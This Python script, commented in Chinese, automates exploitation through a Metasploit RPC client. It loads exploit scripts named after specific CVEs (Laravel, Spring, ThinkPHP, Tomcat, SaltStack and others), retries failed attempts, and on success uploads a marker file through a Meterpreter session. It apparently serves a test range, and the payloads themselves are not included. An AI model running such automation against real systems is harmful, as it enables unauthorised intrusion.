import time

from pymetasploit3.msfrpc import MsfRpcClient

from py_config import ConfigFactory
from py_logging import LoggerFactory


class MetasploitClient():
    # 初始化
    def __init__(self, config, logger) -> None:
        self.config = config
        self.logger = logger
        # msf连接参数
        self.server = '192.168.33.241'
        self.port = 55552
        self.num = 1

    # 加载攻击文本
    def load_script(self, script_name: str) -> str:
        script_name = self.config.get(
            'vuls', 'path')+'/%s' % (script_name+'.txt')
        data = ''
        with open(script_name, 'r') as script_file:
            lines = script_file.readlines()
            for line in lines:
                data = data+line
            self.logger.info(data)
        return data

    # 执行攻击脚本
    def attack(self, attack_script: str) -> str:

        # 初始化client
        self.client = MsfRpcClient(user='msf', password='admin',
                                   server=self.server, port=self.port)

        # 初始化console
        cid = self.client.consoles.console().cid
        self.console = self.client.consoles.console(cid=cid)
        self.console.read()

        self.console.write(attack_script)

        # 获取结果
        result = ''
        while result == '' or self.console.is_busy():
            time.sleep(1)
            result += self.console.read()['data']
        print(result)

        # 递归攻击
        while (('Exploit completed, but no session was created.' in result) or ('target may not be vulnerable.' in result)) and (self.num < 3):
            self.num = self.num+1
            print('====retry '+str(self.num)+'====')
            self.attack(attack_script=attack_script)

        # 判断是否攻击成功
        if ' created in the background.' in result:
            status = 'success'
        else:
            status = 'failure'

        # 返回结果
        self.logger.info(status)
        self.logger.info(result)
        return status, result

    # 执行meterpreter指令
    def meterpreter(self):
        # 获取sessionid
        sids = []
        for key in self.client.sessions.list.keys():
            sids.append(key)

        if len(sids) > 0:
            # 获取session
            self.session = self.client.sessions.session(sid=sids[0])

        # 执行攻击后指令
        meterpreter_cmd = 'upload /home/kali/success /tmp/igot'
        end_strs = '/home/kali/success -> /tmp/igot'
        result = self.session.run_with_output(
            cmd=meterpreter_cmd, end_strs=end_strs)
        # print(result)

        if 'uploaded   : /home/kali/success -> /tmp/igot' in result:
            status = 'success'
        else:
            status = 'failure'

        # 关闭所有已经打开的session
        self.console.write('sessions -K')

        # 销毁console
        self.console.destroy()

        # 返回
        return status, result


if __name__ == '__main__':
    config = ConfigFactory(config_file='py_robot202.ini').get_config()
    logger = LoggerFactory(config_factory=config).get_logger()

    # script_name = 'py_hadoop_unauthorized-yarn'
    # script_name = 'py_activemq_cve-2016-3088'
    # script_name = 'py_spring_cve-2022-22963'
    # script_name = 'py_thinkphp_cve-2019-9082'
    # script_name = 'py_tomcat_cve-2020-1938'
    # script_name = 'py_saltstack_cve-2020-11651'
    script_name = 'py_laravel_cve-2021-3129'

    metasploit_client = MetasploitClient(config=config, logger=logger)
    attack_script = metasploit_client.load_script(script_name=script_name)
    status, result = metasploit_client.attack(attack_script=attack_script)
    if status == 'success':
        status, result = metasploit_client.meterpreter()
    else:
        logger.debug('failure')
    print(status, result)
